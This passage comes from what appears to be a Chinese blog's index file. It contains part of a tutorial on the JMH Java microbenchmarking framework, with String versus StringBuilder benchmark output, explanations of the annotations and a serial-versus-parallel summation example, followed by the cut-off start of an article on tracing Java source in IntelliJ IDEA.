punctuation">.</span>0_131<span class="token punctuation">,</span> VM <span class="token number">25.131</span><span class="token operator">-</span>b11# VM invoker<span class="token operator">:</span> C<span class="token operator">:</span>\Program Files\Java\jdk1<span class="token number">.8</span><span class="token punctuation">.</span>0_131\jre\bin\java<span class="token punctuation">.</span>exe# VM options<span class="token operator">:</span> <span class="token operator">-</span>javaagent<span class="token operator">:</span>E<span class="token operator">:</span>\Program Files\JetBrains\IntelliJ IDEA <span class="token number">2017.3</span>\lib\idea_rt<span class="token punctuation">.</span>jar<span class="token operator">=</span><span class="token number">62744</span><span class="token operator">:</span>E<span class="token operator">:</span>\Program Files\JetBrains\IntelliJ IDEA <span class="token number">2017.3</span>\bin <span class="token operator">-</span>Dfile<span class="token punctuation">.</span>encoding<span class="token operator">=</span>UTF<span class="token operator">-</span><span class="token number">8</span># Warmup<span class="token operator">:</span> <span class="token number">3</span> iterations<span class="token punctuation">,</span> <span class="token number">1</span> s each# Measurement<span class="token operator">:</span> <span class="token number">10</span> iterations<span class="token punctuation">,</span> <span class="token number">5</span> s each# Timeout<span class="token operator">:</span> <span class="token number">10</span> min per iteration# Threads<span class="token operator">:</span> <span class="token number">16</span> threads<span class="token punctuation">,</span> will synchronize iterations# Benchmark mode<span class="token operator">:</span> Throughput<span class="token punctuation">,</span> ops<span class="token operator">/</span>time# Benchmark<span class="token operator">:</span> com<span class="token punctuation">.</span>xncoding<span class="token punctuation">.</span>benchmark<span class="token punctuation">.</span>string<span class="token punctuation">.</span>StringBuilderBenchmark<span class="token punctuation">.</span>testStringAdd# Run progress<span class="token operator">:</span> <span class="token number">0.00</span><span class="token operator">%</span> complete<span class="token punctuation">,</span> ETA <span class="token number">00</span><span class="token operator">:</span><span class="token number">03</span><span class="token operator">:</span><span class="token number">32</span># Fork<span class="token operator">:</span> <span class="token number">1</span> of <span class="token number">2</span># Warmup Iteration   <span class="token number">1</span><span class="token operator">:</span> <span class="token number">7332.410</span> ops<span class="token operator">/</span>ms# Warmup Iteration   <span class="token number">2</span><span class="token operator">:</span> <span class="token number">8758.506</span> ops<span class="token operator">/</span>ms# Warmup Iteration   <span class="token number">3</span><span class="token operator">:</span> <span class="token number">9078.783</span> ops<span class="token operator">/</span>msIteration   <span class="token number">1</span><span class="token operator">:</span> <span class="token number">8824.713</span> ops<span class="token operator">/</span>msIteration   <span class="token number">2</span><span class="token operator">:</span> <span class="token number">9084.977</span> ops<span class="token operator">/</span>msIteration   <span class="token number">3</span><span class="token operator">:</span> <span class="token number">9412.712</span> ops<span class="token operator">/</span>msIteration   <span class="token number">4</span><span class="token operator">:</span> <span class="token number">8843.631</span> ops<span class="token operator">/</span>msIteration   <span class="token number">5</span><span class="token operator">:</span> <span class="token number">9030.556</span> ops<span class="token operator">/</span>msIteration   <span class="token number">6</span><span class="token operator">:</span> <span class="token number">9090.677</span> ops<span class="token operator">/</span>msIteration   <span class="token number">7</span><span class="token operator">:</span> <span class="token number">9493.148</span> ops<span class="token operator">/</span>msIteration   <span class="token number">8</span><span class="token operator">:</span> <span class="token number">8664.593</span> ops<span class="token operator">/</span>msIteration   <span class="token number">9</span><span class="token operator">:</span> <span class="token number">8835.227</span> ops<span class="token operator">/</span>msIteration  <span class="token number">10</span><span class="token operator">:</span> <span class="token number">8570.212</span> ops<span class="token operator">/</span>ms# Run progress<span class="token operator">:</span> <span class="token number">25.00</span><span class="token operator">%</span> complete<span class="token punctuation">,</span> ETA <span class="token number">00</span><span class="token operator">:</span><span class="token number">03</span><span class="token operator">:</span><span class="token number">15</span># Fork<span class="token operator">:</span> <span class="token number">2</span> of <span class="token number">2</span># Warmup Iteration   <span class="token number">1</span><span class="token operator">:</span> <span class="token number">5350.686</span> ops<span class="token operator">/</span>ms# Warmup Iteration   <span class="token number">2</span><span class="token operator">:</span> <span class="token number">8862.238</span> ops<span class="token operator">/</span>ms# Warmup Iteration   <span class="token number">3</span><span class="token operator">:</span> <span class="token number">8086.594</span> ops<span class="token operator">/</span>msIteration   <span class="token number">1</span><span class="token operator">:</span> <span class="token number">9105.306</span> ops<span class="token operator">/</span>msIteration   <span class="token number">2</span><span class="token operator">:</span> <span class="token number">8288.588</span> ops<span class="token operator">/</span>msIteration   <span class="token number">3</span><span class="token operator">:</span> <span class="token number">9307.902</span> ops<span class="token operator">/</span>msIteration   <span class="token number">4</span><span class="token operator">:</span> <span class="token number">9195.150</span> ops<span class="token operator">/</span>msIteration   <span class="token number">5</span><span class="token operator">:</span> <span class="token number">8715.555</span> ops<span class="token operator">/</span>msIteration   <span class="token number">6</span><span class="token operator">:</span> <span class="token number">9075.069</span> ops<span class="token operator">/</span>msIteration   <span class="token number">7</span><span class="token operator">:</span> <span class="token number">9041.037</span> ops<span class="token operator">/</span>msIteration   <span class="token number">8</span><span class="token operator">:</span> <span class="token number">9187.099</span> ops<span class="token operator">/</span>msIteration   <span class="token number">9</span><span class="token operator">:</span> <span class="token number">9145.134</span> ops<span class="token operator">/</span>msIteration  <span class="token number">10</span><span class="token operator">:</span> <span class="token number">9124.229</span> ops<span class="token operator">/</span>msResult <span class="token string">"com.xncoding.benchmark.string.StringBuilderBenchmark.testStringAdd"</span><span class="token operator">:</span>  <span class="token number">9001.776</span> ±<span class="token punctuation">(</span><span class="token number">99.9</span><span class="token operator">%</span><span class="token punctuation">)</span> <span class="token number">253.496</span> ops<span class="token operator">/</span>ms <span class="token punctuation">[</span>Average<span class="token punctuation">]</span>  <span class="token punctuation">(</span>min<span class="token punctuation">,</span> avg<span class="token punctuation">,</span> max<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">8288.588</span><span class="token punctuation">,</span> <span class="token number">9001.776</span><span class="token punctuation">,</span> <span class="token number">9493.148</span><span class="token punctuation">)</span><span class="token punctuation">,</span> stdev <span class="token operator">=</span> <span class="token number">291.926</span>  <span class="token function">CI</span> <span class="token punctuation">(</span><span class="token number">99.9</span><span class="token operator">%</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">8748.280</span><span class="token punctuation">,</span> <span class="token number">9255.272</span><span class="token punctuation">]</span> <span class="token punctuation">(</span>assumes normal distribution<span class="token punctuation">)</span># JMH version<span class="token operator">:</span> <span class="token number">1.20</span># VM version<span class="token operator">:</span> JDK <span class="token number">1.8</span><span class="token punctuation">.</span>0_131<span class="token punctuation">,</span> VM <span class="token number">25.131</span><span class="token operator">-</span>b11# VM invoker<span class="token operator">:</span> C<span class="token operator">:</span>\Program Files\Java\jdk1<span class="token number">.8</span><span class="token punctuation">.</span>0_131\jre\bin\java<span class="token punctuation">.</span>exe# VM options<span class="token operator">:</span> <span class="token operator">-</span>javaagent<span class="token operator">:</span>E<span class="token operator">:</span>\Program Files\JetBrains\IntelliJ IDEA <span class="token number">2017.3</span>\lib\idea_rt<span class="token punctuation">.</span>jar<span class="token operator">=</span><span class="token number">62744</span><span class="token operator">:</span>E<span class="token operator">:</span>\Program Files\JetBrains\IntelliJ IDEA <span class="token number">2017.3</span>\bin <span class="token operator">-</span>Dfile<span class="token punctuation">.</span>encoding<span class="token operator">=</span>UTF<span class="token operator">-</span><span class="token number">8</span># Warmup<span class="token operator">:</span> <span class="token number">3</span> iterations<span class="token punctuation">,</span> <span class="token number">1</span> s each# Measurement<span class="token operator">:</span> <span class="token number">10</span> iterations<span class="token punctuation">,</span> <span class="token number">5</span> s each# Timeout<span class="token operator">:</span> <span class="token number">10</span> min per iteration# Threads<span class="token operator">:</span> <span class="token number">16</span> threads<span class="token punctuation">,</span> will synchronize iterations# Benchmark mode<span class="token operator">:</span> Throughput<span class="token punctuation">,</span> ops<span class="token operator">/</span>time# Benchmark<span class="token operator">:</span> com<span class="token punctuation">.</span>xncoding<span class="token punctuation">.</span>benchmark<span class="token punctuation">.</span>string<span class="token punctuation">.</span>StringBuilderBenchmark<span class="token punctuation">.</span>testStringBuilderAdd# Run progress<span class="token operator">:</span> <span class="token number">50.00</span><span class="token operator">%</span> complete<span class="token punctuation">,</span> ETA <span class="token number">00</span><span class="token operator">:</span><span class="token number">02</span><span class="token operator">:</span><span class="token number">07</span># Fork<span class="token operator">:</span> <span class="token number">1</span> of <span class="token number">2</span># Warmup Iteration   <span class="token number">1</span><span class="token operator">:</span> <span class="token number">27202.528</span> ops<span class="token operator">/</span>ms# Warmup Iteration   <span class="token number">2</span><span class="token operator">:</span> <span class="token number">26500.586</span> ops<span class="token operator">/</span>ms# Warmup Iteration   <span class="token number">3</span><span class="token operator">:</span> <span class="token number">27190.346</span> ops<span class="token operator">/</span>msIteration   <span class="token number">1</span><span class="token operator">:</span> <span class="token number">27891.257</span> ops<span class="token operator">/</span>msIteration   <span class="token number">2</span><span class="token operator">:</span> <span class="token number">28704.541</span> ops<span class="token operator">/</span>msIteration   <span class="token number">3</span><span class="token operator">:</span> <span class="token number">27785.951</span> ops<span class="token operator">/</span>msIteration   <span class="token number">4</span><span class="token operator">:</span> <span class="token number">26841.454</span> ops<span class="token operator">/</span>msIteration   <span class="token number">5</span><span class="token operator">:</span> <span class="token number">26024.288</span> ops<span class="token operator">/</span>msIteration   <span class="token number">6</span><span class="token operator">:</span> <span class="token number">25592.494</span> ops<span class="token operator">/</span>msIteration   <span class="token number">7</span><span class="token operator">:</span> <span class="token number">25626.875</span> ops<span class="token operator">/</span>msIteration   <span class="token number">8</span><span class="token operator">:</span> <span class="token number">25302.248</span> ops<span class="token operator">/</span>msIteration   <span class="token number">9</span><span class="token operator">:</span> <span class="token number">25519.780</span> ops<span class="token operator">/</span>msIteration  <span class="token number">10</span><span class="token operator">:</span> <span class="token number">25275.334</span> ops<span class="token operator">/</span>ms# Run progress<span class="token operator">:</span> <span class="token number">75.00</span><span class="token operator">%</span> complete<span class="token punctuation">,</span> ETA <span class="token number">00</span><span class="token operator">:</span><span class="token number">01</span><span class="token operator">:</span><span class="token number">02</span># Fork<span class="token operator">:</span> <span class="token number">2</span> of <span class="token number">2</span># Warmup Iteration   <span class="token number">1</span><span class="token operator">:</span> <span class="token number">30376.008</span> ops<span class="token operator">/</span>ms# Warmup Iteration   <span class="token number">2</span><span class="token operator">:</span> <span class="token number">25131.064</span> ops<span class="token operator">/</span>ms# Warmup Iteration   <span class="token number">3</span><span class="token operator">:</span> <span class="token number">25622.342</span> ops<span class="token operator">/</span>msIteration   <span class="token number">1</span><span class="token operator">:</span> <span class="token number">25386.845</span> ops<span class="token operator">/</span>msIteration   <span class="token number">2</span><span class="token operator">:</span> <span class="token number">25825.139</span> ops<span class="token operator">/</span>msIteration   <span class="token number">3</span><span class="token operator">:</span> <span class="token number">26029.607</span> ops<span class="token operator">/</span>msIteration   <span class="token number">4</span><span class="token operator">:</span> <span class="token number">25531.748</span> ops<span class="token operator">/</span>msIteration   <span class="token number">5</span><span class="token operator">:</span> <span class="token number">25374.934</span> ops<span class="token operator">/</span>msIteration   <span class="token number">6</span><span class="token operator">:</span> <span class="token number">25204.530</span> ops<span class="token operator">/</span>msIteration   <span class="token number">7</span><span class="token operator">:</span> <span class="token number">22934.211</span> ops<span class="token operator">/</span>msIteration   <span class="token number">8</span><span class="token operator">:</span> <span class="token number">23907.677</span> ops<span class="token operator">/</span>msIteration   <span class="token number">9</span><span class="token operator">:</span> <span class="token number">24337.963</span> ops<span class="token operator">/</span>msIteration  <span class="token number">10</span><span class="token operator">:</span> <span class="token number">24660.626</span> ops<span class="token operator">/</span>msResult <span class="token string">"com.xncoding.benchmark.string.StringBuilderBenchmark.testStringBuilderAdd"</span><span class="token operator">:</span>  <span class="token number">25687.875</span> ±<span class="token punctuation">(</span><span class="token number">99.9</span><span class="token operator">%</span><span class="token punctuation">)</span> <span class="token number">1167.955</span> ops<span class="token operator">/</span>ms <span class="token punctuation">[</span>Average<span class="token punctuation">]</span>  <span class="token punctuation">(</span>min<span class="token punctuation">,</span> avg<span class="token punctuation">,</span> max<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">22934.211</span><span class="token punctuation">,</span> <span class="token number">25687.875</span><span class="token punctuation">,</span> <span class="token number">28704.541</span><span class="token punctuation">)</span><span class="token punctuation">,</span> stdev <span class="token operator">=</span> <span class="token number">1345.019</span>  <span class="token function">CI</span> <span class="token punctuation">(</span><span class="token number">99.9</span><span class="token operator">%</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">24519.920</span><span class="token punctuation">,</span> <span class="token number">26855.830</span><span class="token punctuation">]</span> <span class="token punctuation">(</span>assumes normal distribution<span class="token punctuation">)</span># Run complete<span class="token punctuation">.</span> Total time<span class="token operator">:</span> <span class="token number">00</span><span class="token operator">:</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">08</span>Benchmark                                     Mode  Cnt      Score      Error   UnitsStringBuilderBenchmark<span class="token punctuation">.</span>testStringAdd         thrpt   <span class="token number">20</span>   <span class="token number">9001.776</span> ±  <span class="token number">253.496</span>  ops<span class="token operator">/</span>msStringBuilderBenchmark<span class="token punctuation">.</span>testStringBuilderAdd  thrpt   <span class="token number">20</span>  <span class="token number">25687.875</span> ± <span class="token number">1167.955</span>  ops<span class="token operator">/</span>ms</code></pre><p>仔细看，三大部分，第一部分是字符串用加号连接执行的结果，第二部分是StringBuilder执行的结果，第三部分就是两个的简单结果比较。这里注意我们forks传的2，所以每个测试有两个fork结果。</p><p>前两部分是一样的，简单说下。首先会写出每部分的一些参数设置，然后是预热迭代执行（Warmup Iteration）， 然后是正常的迭代执行（Iteration），最后是结果（Result）。这些看看就好，我们最关注的就是第三部分， 其实也就是最终的结论。千万别看歪了，他输出的也确实很不爽，error那列其实没有内容，score的结果是xxx ± xxx，单位是每毫秒多少个操作。可以看到，StringBuilder的速度还确实是要比String进行文字叠加的效率好太多。</p><h2 id="注解介绍"><a href="#注解介绍" class="headerlink" title="注解介绍"></a>注解介绍</h2><p>好了，当你对JMH有了一个基本认识后，现在来详细解释一下前面代码中的各个注解含义。</p><h3 id="BenchmarkMode"><a href="#BenchmarkMode" class="headerlink" title="@BenchmarkMode"></a>@BenchmarkMode</h3><p>基准测试类型。这里选择的是Throughput也就是吞吐量。根据源码点进去，每种类型后面都有对应的解释，比较好理解，吞吐量会得到单位时间内可以进行的操作数。</p><ul><li>Throughput: 整体吞吐量，例如“1秒内可以执行多少次调用”。</li><li>AverageTime: 调用的平均时间，例如“每次调用平均耗时xxx毫秒”。</li><li>SampleTime: 随机取样，最后输出取样结果的分布，例如“99%的调用在xxx毫秒以内，99.99%的调用在xxx毫秒以内”</li><li>SingleShotTime: 以上模式都是默认一次 iteration 是 1s，唯有 SingleShotTime 是只运行一次。往往同时把 warmup 次数设为0，用于测试冷启动时的性能。</li><li>All(“all”, “All benchmark modes”);</li></ul><h3 id="Warmup"><a href="#Warmup" class="headerlink" title="@Warmup"></a>@Warmup</h3><p>上面我们提到了，进行基准测试前需要进行预热。一般我们前几次进行程序测试的时候都会比较慢， 所以要让程序进行几轮预热，保证测试的准确性。其中的参数iterations也就非常好理解了，就是预热轮数。</p><p>为什么需要预热？因为 JVM 的 JIT 机制的存在，如果某个函数被调用多次之后，JVM 会尝试将其编译成为机器码从而提高执行速度。所以为了让 benchmark 的结果更加接近真实情况就需要进行预热。</p><h3 id="Measurement"><a href="#Measurement" class="headerlink" title="@Measurement"></a>@Measurement</h3><p>度量，其实就是一些基本的测试参数。</p><ol><li>iterations 进行测试的轮次</li><li>time 每轮进行的时长</li><li>timeUnit 时长单位</li></ol><p>都是一些基本的参数，可以根据具体情况调整。一般比较重的东西可以进行大量的测试，放到服务器上运行。</p><h3 id="Threads"><a href="#Threads" class="headerlink" title="@Threads"></a>@Threads</h3><p>每个进程中的测试线程，这个非常好理解，根据具体情况选择，一般为cpu乘以2。</p><h3 id="Fork"><a href="#Fork" class="headerlink" title="@Fork"></a>@Fork</h3><p>进行 fork 的次数。如果 fork 数是2的话，则 JMH 会 fork 出两个进程来进行测试。</p><h3 id="OutputTimeUnit"><a href="#OutputTimeUnit" class="headerlink" title="@OutputTimeUnit"></a>@OutputTimeUnit</h3><p>这个比较简单了，基准测试结果的时间类型。一般选择秒、毫秒、微秒。</p><h3 id="Benchmark"><a href="#Benchmark" class="headerlink" title="@Benchmark"></a>@Benchmark</h3><p>方法级注解，表示该方法是需要进行 benchmark 的对象，用法和 JUnit 的 @Test 类似。</p><h3 id="Param"><a href="#Param" class="headerlink" title="@Param"></a>@Param</h3><p>属性级注解，@Param 可以用来指定某项参数的多种情况。特别适合用来测试一个函数在不同的参数输入的情况下的性能。</p><h3 id="Setup"><a href="#Setup" class="headerlink" title="@Setup"></a>@Setup</h3><p>方法级注解，这个注解的作用就是我们需要在测试之前进行一些准备工作，比如对一些数据的初始化之类的。</p><h3 id="TearDown"><a href="#TearDown" class="headerlink" title="@TearDown"></a>@TearDown</h3><p>方法级注解，这个注解的作用就是我们需要在测试之后进行一些结束工作，比如关闭线程池，数据库连接等的，主要用于资源的回收等。</p><h3 id="State"><a href="#State" class="headerlink" title="@State"></a>@State</h3><p>当使用@Setup参数的时候，必须在类上加这个参数，不然会提示无法运行。</p><p>State 用于声明某个类是一个“状态”，然后接受一个 Scope 参数用来表示该状态的共享范围。 因为很多 benchmark 会需要一些表示状态的类，JMH 允许你把这些类以依赖注入的方式注入到 benchmark 函数里。Scope 主要分为三种。</p><ol><li>Thread: 该状态为每个线程独享。</li><li>Group: 该状态为同一个组里面所有线程共享。</li><li>Benchmark: 该状态在所有线程间共享。</li></ol><p>关于State的用法，官方的 code sample 里有比较好的<a href="http://hg.openjdk.java.net/code-tools/jmh/file/cb9aa824b55a/jmh-samples/src/main/java/org/openjdk/jmh/samples/JMHSample_03_States.java" target="_blank" rel="noopener">例子</a>。</p><h2 id="第二个例子"><a href="#第二个例子" class="headerlink" title="第二个例子"></a>第二个例子</h2><p>再来看一个更常规一点性能测试的例子，</p><p>计算 1 ~ n 之和，比较串行算法和并行算法的效率，看 n 在大约多少时并行算法开始超越串行算法</p><p>首先定义一个表示这两种实现的接口：</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">/** * Calculator * * @author XiongNeng * @version 1.0 * @since 2018/1/7 */</span><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">Calculator</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">/**     * calculate sum of an integer array     *     * @param numbers     * @return     */</span>    <span class="token keyword">public</span> <span class="token keyword">long</span> <span class="token function">sum</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> numbers<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/**     * shutdown pool or reclaim any related resources     */</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">shutdown</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>具体的两种实现代码我就不贴了，主要说明一下串行算法和并行算法实现原理：</p><ul><li>串行算法：使用 for-loop 来计算 n 个正整数之和。</li><li>并行算法：将所需要计算的 n 个正整数分成 m 份，交给 m 个线程分别计算出和以后，再把它们的结果相加。</li></ul><p>进行 benchmark 的代码如下：</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">/** * 自然数求和的串行和并行算法性能测试 * * @author XiongNeng * @version 1.0 * @since 2018/1/7 */</span><span class="token annotation punctuation">@BenchmarkMode</span><span class="token punctuation">(</span>Mode<span class="token punctuation">.</span>AverageTime<span class="token punctuation">)</span><span class="token annotation punctuation">@OutputTimeUnit</span><span class="token punctuation">(</span>TimeUnit<span class="token punctuation">.</span>MICROSECONDS<span class="token punctuation">)</span><span class="token annotation punctuation">@State</span><span class="token punctuation">(</span>Scope<span class="token punctuation">.</span>Benchmark<span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SecondBenchmark</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Param</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"10000"</span><span class="token punctuation">,</span> <span class="token string">"100000"</span><span class="token punctuation">,</span> <span class="token string">"1000000"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> length<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> numbers<span class="token punctuation">;</span>    <span class="token keyword">private</span> Calculator singleThreadCalc<span class="token punctuation">;</span>    <span class="token keyword">private</span> Calculator multiThreadCalc<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        Options opt <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">OptionsBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">include</span><span class="token punctuation">(</span>SecondBenchmark<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getSimpleName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">forks</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">warmupIterations</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">measurementIterations</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Collection<span class="token operator">&lt;</span>RunResult<span class="token operator">></span> results <span class="token operator">=</span>  <span class="token keyword">new</span> <span class="token class-name">Runner</span><span class="token punctuation">(</span>opt<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ResultExporter<span class="token punctuation">.</span><span class="token function">exportResult</span><span class="token punctuation">(</span><span class="token string">"单线程与多线程求和性能"</span><span class="token punctuation">,</span> results<span class="token punctuation">,</span> <span class="token string">"length"</span><span class="token punctuation">,</span> <span class="token string">"微秒"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Benchmark</span>    <span class="token keyword">public</span> <span class="token keyword">long</span> <span class="token function">singleThreadBench</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> singleThreadCalc<span class="token punctuation">.</span><span class="token function">sum</span><span class="token punctuation">(</span>numbers<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Benchmark</span>    <span class="token keyword">public</span> <span class="token keyword">long</span> <span class="token function">multiThreadBench</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> multiThreadCalc<span class="token punctuation">.</span><span class="token function">sum</span><span class="token punctuation">(</span>numbers<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Setup</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">prepare</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        numbers <span class="token operator">=</span> IntStream<span class="token punctuation">.</span><span class="token function">rangeClosed</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> length<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        singleThreadCalc <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SinglethreadCalculator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        multiThreadCalc <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MultithreadCalculator</span><span class="token punctuation">(</span>Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">availableProcessors</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@TearDown</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">shutdown</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        singleThreadCalc<span class="token punctuation">.</span><span class="token function">shutdown</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        multiThreadCalc<span class="token punctuation">.</span><span class="token function">shutdown</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>我在自己的笔记本电脑上跑下来的结果，总数在10000时并行算法不如串行算法， 总数达到100000时并行算法开始和串行算法接近，总数达到1000000时并行算法所耗时间约是串行算法的一半左右。</p><p><a href="https://xnstatic-1253397658.file.myqcloud.com/jmh01.png" target="_blank" rel="noopener"><img src="https://xnstatic-1253397658.file.myqcloud.com/jmh01.png" alt="img"></a></p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul><li><a href="http://irfen.me/java-jmh-simple-microbenchmark/" target="_blank" rel="noopener">Java使用JMH进行简单的基准测试Benchmark</a></li><li><a href="http://blog.dyngr.com/blog/2016/10/29/introduction-of-jmh/" target="_blank" rel="noopener">Java 并发编程笔记：JMH 性能测试框架</a></li><li><a href="http://tutorials.jenkov.com/java-performance/jmh.html" target="_blank" rel="noopener">JMH - Java Microbenchmark Harness</a></li></ul><p>本文转载自:  <a href="https://www.xncoding.com/2018/01/07/java/jmh.html" target="_blank" rel="noopener">Java微基准测试框架JMH</a></p>]]></content>
      
      
      <categories>
          
          <category> 常用工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 开发工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>用IDEA跟踪Java源码的技巧</title>
      <link href="/2018/12/28/chang-yong-gong-ju/yong-idea-gen-zong-java-yuan-ma-de-ji-qiao/"/>
      <url>/2018/12/28/chang-yong-gong-ju/yong-idea-gen-zong-java-yuan-ma-de-ji-qiao/</url>
      
        <content type="html"><![CDATA[<h2 id="用IDEA跟踪Java源码的技巧"><a href="#用IDEA跟踪Java源码的技巧" class="headerlink" title="用IDEA跟踪Java源码的技巧"></a>用IDEA跟踪Java源码的技巧</h2><p>之前关于 IDEA 的文章，我已经写了三篇，没想到挺受大家喜欢的。读本文前，可以先读一下我之前写的这几篇文章来提前做个热身。</p><p><a href="http://mp.weixin.qq.com/s?__biz=MzIzMzgxOTQ5NA==&amp;mid=2247485196&amp;idx=1&amp;sn=9160d260e7f4cf5941f27c884a62e8e5&amp;chksm=e8fe9b05df891213e2ce2b46824f7c67cac7e5be10e84aa8102e9c65edec5cc40a40550ac9a7&amp;scene=21#wechat_redirect" target="_blank" rel="noopener">谈谈我与 Intellij IDEA 的故事</a></p><p><a href="http://mp.weixin.qq.com/s?__biz=MzIzMzgxOTQ5NA==&amp;mid=2247485334&amp;idx=1&amp;sn=017d57f85f7e75a25309c7b95235e70b&amp;chksm=e8fe9b9fdf8912891b93a420c98718db9fff874fe5d16f66e55e6dd401ad13856ff1287070d1&amp;scene=21#wechat_redirect" target="_blank" rel="noopener">Intellij IDEA 中我一直在用的几个插件</a></p><p><a href="http://mp.weixin.qq.com/s?__biz=MzIzMzgxOTQ5NA==&amp;mid=2247485958&amp;idx=1&amp;sn=b1a7b68324b0eb250982129359c7ce20&amp;chksm=e8fe960fdf891f19ed4067094300acfe7744bda3190c6ba81e274573abc0eef448218add953c&amp;scene=21#wechat_redirect" target="_blank" rel="noopener">IDEA 2018.3 EAP，我只看好你这四个功能！</a></p><p>其实不乏有读者问我，如何才能熟练的掌握 IDEA？我跟他说，如果某天你真的关掉了 Tab 页，习惯用 Ctrl + E 快捷键，那么你算开始入门了。</p><p>长期关注我的读者，应该知道我前几天写的《<a href="http://mp.weixin.qq.com/s?__biz=MzIzMzgxOTQ5NA==&amp;mid=2247485911&amp;idx=1&amp;sn=d6cd116c643a1460f95324b3619c3102&amp;chksm=e8fe95dedf891cc88f12a8558f28a6627ab8ecc205819a11dbce097ab85700c513970198e8be&amp;scene=21#wechat_redirect" target="_blank" rel="noopener">怎么读 Tomcat 源码？</a>》，该文只是教你把 Tomcat 的开发环境搭建起来，并没有指导你怎么来读源码。正好这几天跟群里的同学讨论如何利用 IDEA 来跟踪源码，我正好用这篇文章来总结一下。</p><p>还是那句话，拿起键盘就是<strong>干</strong>！</p><p>本文还是以 Tomcat 源码为例。</p><h2 id="生成类继承图"><a href="#生成类继承图" class="headerlink" title="生成类继承图"></a><strong>生成类继承图</strong></h2><p>先给各位读者看下面这张类继承图，也是我之前所写的一篇文章中提到过的《<a href="http://mp.weixin.qq.com/s?__biz=MzIzMzgxOTQ5NA==&amp;mid=2247485660&amp;idx=1&amp;sn=a80d3c8937ec432e6a9518e10ea75543&amp;chksm=e8fe94d5df891dc3ff8cb9f0647952dd874b8e3edebc17114507012a694f1ca2d455361f6cc5&amp;scene=21#wechat_redirect" target="_blank" rel="noopener">工作五年难道必须要读源码吗？</a>》，是不是一目了然。</p><p><img 